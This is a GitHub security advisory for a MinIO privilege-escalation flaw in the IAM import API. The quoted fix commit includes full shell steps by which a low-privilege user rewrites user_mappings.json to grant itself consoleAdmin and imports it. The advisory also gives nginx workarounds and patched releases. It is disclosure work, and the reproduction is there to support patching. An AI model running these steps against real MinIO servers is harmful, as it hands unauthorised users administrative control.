# [H] MinIO vulnerable to privilege escalation in IAM import API

## Summary
Severity: High
Advisory: GHSA-cwq8-g58r-32hg
CVE: CVE-2024-55949
CWE: CWE-269
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2024-12-16
Source: https://github.com/advisories/GHSA-cwq8-g58r-32hg
Type: github-advisory

## Affected
- Go: `github.com/minio/minio` — affected >=0.0.0-20220623162515-580d9db85e04 <0.0.0-20241213221912-68b004a48f41

## Details
### Impact
Privilege escalation in IAM import API, all users are impacted since MinIO commit 580d9db85e04f1b63cc2909af50f0ed08afa965f

### Patches
```
commit f246c9053f9603e610d98439799bdd2a6b293427
Author: Aditya Manthramurthy <donatello@users.noreply.github.com>
Date:   Wed Dec 11 18:09:40 2024 -0800

    fix: Privilege escalation in IAM import API (#20756)
    
    This API had missing permissions checking, allowing a user to change
    their policy mapping by:
    
    1. Craft iam-info.zip file: Update own user permission in
    user_mappings.json
    2. Upload it via `mc admin cluster iam import nobody iam-info.zip`
    
    Here `nobody` can be a user with pretty much any kind of permission (but
    not anonymous) and this ends up working.
    
    Some more detailed steps - start from a fresh setup:
    
    ```
    ./minio server /tmp/d{1...4} &
    mc alias set myminio http://localhost:9000 minioadmin minioadmin
    mc admin user add myminio nobody nobody123
    mc admin policy attach myminio readwrite nobody nobody123
    mc alias set nobody http://localhost:9000 nobody nobody123
    
    mc admin cluster iam export myminio
    mkdir /tmp/x && mv myminio-iam-info.zip /tmp/x
    cd /tmp/x
    unzip myminio-iam-info.zip
    echo '{"nobody":{"version":1,"policy":"consoleAdmin","updatedAt":"2024-08-13T19:47:10.1Z"}}' > \
          iam-assets/user_mappings.json
    zip -r myminio-iam-info-updated.zip iam-assets/
    
    mc admin cluster iam import nobody ./myminio-iam-info-updated.zip
    mc admin service restart nobody
    ```
```

### Workarounds
There are no workarounds possible, all users are advised to upgrade immediately if you don't run MinIO behind a load balancer.

Behind a load balancer / firewall such as `nginx` . 

```
location /minio/admin/v2/import-iam {
...
}
```

```
location /minio/admin/v3/import-iam-v2 {
...
```

Following locations can be blocked from external access, temporarily disallowing the API calls completely until the deployments can be upgraded.

### References
Refer https://github.com/minio/minio/pull/20756 for more information 

### Binary Releases
#### AiStor Containers
```
quay.io/minio/aistor/minio:RELEASE.2024-12-13T13-42-41Z
quay.io/minio/aistor/minio:RELEASE.2024-12-13T13-42-41Z.fips
```

#### AiStor Binaries
#####  Architecture: `linux/amd64`
- https://dl.min.io/aistor/minio/release/linux-amd64/archive/minio.RELEASE.2024-12-13T13-42-41Z

##### Architecture: `linux/arm64`
- https://dl.min.io/aistor/minio/release/linux-arm64/archive/minio.RELEASE.2024-12-13T13-42-41Z

##### Architecture: `windows/amd64`
- https://dl.min.io/aistor/minio/release/windows-amd64/archive/minio.RELEASE.2024-12-13T13-42-41Z

### Community Containers
```
quay.io/minio/minio:RELEASE.2024-12-13T22-19-12Z
quay.io/minio/minio:RELEASE.2024-12-13T22-19-12Z.fips
```

### Community Binaries
#####  Architecture: `linux/amd64`
- https://dl.min.io/server/minio/release/linux-amd64/archive/minio.RELEASE.2024-12-13T22-19-12Z

##### Architecture: `linux/arm64`
- https://dl.min.io/server/minio/release/linux-arm64/archive/minio.RELEASE.2024-12-13T22-19-12Z

##### Architecture: `windows/amd64`
- https://dl.min.io/server/minio/release/windows-amd64/archive/minio.RELEASE.2024-12-13T22-19-12Z

### Credits
Credit goes to [National Security Agency](https://www.nsa.gov/) for reporting this issue.

## References
- https://github.com/minio/minio/security/advisories/GHSA-cwq8-g58r-32hg
- https://nvd.nist.gov/vuln/detail/CVE-2024-55949
- https://github.com/minio/minio/pull/20756
- https://github.com/minio/minio/commit/580d9db85e04f1b63cc2909af50f0ed08afa965f
- https://github.com/minio/minio/commit/f246c9053f9603e610d98439799bdd2a6b293427
- https://github.com/minio/minio
